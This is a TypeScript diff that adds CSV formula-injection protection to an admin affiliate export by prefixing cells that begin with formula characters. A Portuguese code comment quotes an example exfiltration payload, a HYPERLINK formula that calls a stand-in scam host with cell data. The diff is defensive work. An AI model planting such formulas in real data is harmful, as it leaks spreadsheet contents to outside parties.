@@ -5,8 +5,16 @@ import { fetchAdminAffiliateDetail } from "@/lib/api";
 // Separador ";" e vírgula decimal — abre direto no Excel em português.
 const STATUS: Record<string, string> = { pending: "Em análise", available: "A pagar", paid: "Pago", canceled: "Cancelado" };
 
+// "Formula injection": sem isto, alguém cria um afiliado/indicado com nome
+// tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre este CSV no
+// Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem mudar o que
+// aparece na célula (Excel esconde o apóstrofo inicial).
+function neutralizeFormula(text: string): string {
+  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
+}
+
 function cell(value: string | number | undefined): string {
-  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : (value ?? "");
+  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value ?? "");
   return /[;"\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
